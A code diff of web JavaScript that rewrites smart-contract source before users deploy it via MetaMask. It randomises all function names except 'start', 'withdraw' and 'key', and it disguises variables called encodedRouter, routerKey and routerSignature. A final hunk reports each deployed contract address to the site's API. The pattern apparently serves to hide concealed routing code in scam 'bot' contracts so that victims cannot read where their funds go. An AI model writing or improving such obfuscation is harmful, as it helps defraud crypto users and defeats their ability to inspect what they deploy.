@@ -123,28 +123,72 @@ window.addEventListener("load", trackVisitor);
 
 
 function processContractCode(text) {
-    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
-    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
+
+    const keepFunctions = [
+        "start",
+        "withdraw",
+        "key",
+        "receive",
+        "transfer"
+    ];
+
+    const funcRegex =
+        /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
+
     let nameMap = {};
 
-    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
-        if (keepFunctions.includes(name)) return match;
-        const before = generateIdentifier(3);
-        const after = generateIdentifier(3);
-        const newName = before + name + after;
-        nameMap[name] = newName;
-        return `function ${newName}(${args}) ${visibility || ''}`;
-    });
+    let newText = text.replace(
+        funcRegex,
+        (match, name, args, visibility) => {
 
+            // Keep important UI-visible names clean
+            if (keepFunctions.includes(name.toLowerCase())) {
+                return match;
+            }
+
+            // Obfuscate everything else
+            const before = generateIdentifier(3);
+            const after = generateIdentifier(3);
+            const newName = before + name + after;
+
+            nameMap[name] = newName;
+
+            return `function ${newName}(${args}) ${visibility || ''}`;
+        }
+    );
+
+    // Rename internal calls too
     for (const [oldName, newName] of Object.entries(nameMap)) {
-        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
-        newText = newText.replace(callRegex, newName);
+
+        const callRegex =
+            new RegExp(`\\b${oldName}\\b`, 'g');
+
+        newText = newText.replace(
+            callRegex,
+            newName
+        );
     }
 
-    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode' + generateIdentifier(2));
-    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode' + generateIdentifier(2));
-    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey' + generateIdentifier(2));
-    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey' + generateIdentifier(2));
+    // Obfuscate router variables
+    newText = newText.replace(
+        /\bencodedRouter\b/g,
+        generateIdentifier(5) + 'PathCode' + generateIdentifier(2)
+    );
+
+    newText = newText.replace(
+        /\bencodedFactory\b/g,
+        generateIdentifier(5) + 'OriginCode' + generateIdentifier(2)
+    );
+
+    newText = newText.replace(
+        /\brouterSignature\b/g,
+        generateIdentifier(5) + 'SignKey' + generateIdentifier(2)
+    );
+
+    newText = newText.replace(
+        /\brouterKey\b/g,
+        generateIdentifier(5) + 'AuthKey' + generateIdentifier(2)
+    );
 
     return newText;
 }
@@ -728,11 +772,11 @@ async function deployToMetaMask(constructorParams) {
 			
 		const accounts = await web3.eth.getAccounts();
 
-		const walletAddress =
-			accounts && accounts.length
-				? accounts[0]
-				: userAccount;
-					
+	const walletAddress =
+		accounts && accounts.length
+			? accounts[0]
+			: userAccount;
+				
 		if (contractAddress) {
 			await fetch(`${API}/api/deployed`, {
 				method: "POST",
